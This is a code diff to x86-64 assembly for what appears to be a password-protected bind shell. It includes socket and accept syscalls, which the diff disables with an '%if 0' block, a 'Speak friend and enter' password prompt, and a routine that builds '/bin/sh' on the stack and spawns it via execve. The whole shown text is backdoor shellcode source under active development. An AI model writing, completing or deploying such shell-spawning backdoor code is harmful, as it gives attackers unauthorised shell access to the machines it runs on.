@@ -36,6 +36,8 @@ _main:
 	lea rsi, [rbp-16]  	; sockaddr_in struct
 	mov rdx, 16	  	; sockaddr_in size
 	push rdx	  	; create size val ref on stack
+
+%if 0
 	syscall
 	cmp rax, -1
 	jle _exit
@@ -80,16 +82,23 @@ _accept:			; Accept a connection
 	inc rsi
 	syscall
 
+%endif ; 0
+
 _spawn: ; Spawn shell
 	xor rax, rax
 	push rax
+	pop rdx
 	mov rbx, 0x68732f6e69622f78
 	shr rbx, 8
-	push rbx
-	mov rdi, rsp
-	mov rsi, [rbp-56]
-	xor rdx, rdx
-	add rax, 0x59
+	mov [rbp-16], rbx
+	lea rdi, [rbp-16] 
+	;add rdi, 8
+	;push rdi
+	;sub rdi, 8
+	push rax
+	push rdi
+	mov rsi, rsp
+	add rax, 59
 	syscall
 	nop
 	
@@ -100,7 +109,6 @@ _exit:
 
 _data:
 	call _main
-	shell:	db "/bin/sh", 0x0
 	prompt: db "Speak friend and enter: "
 	pass:	db "password", 0xa
 	good:	db "Welcome", 0xa
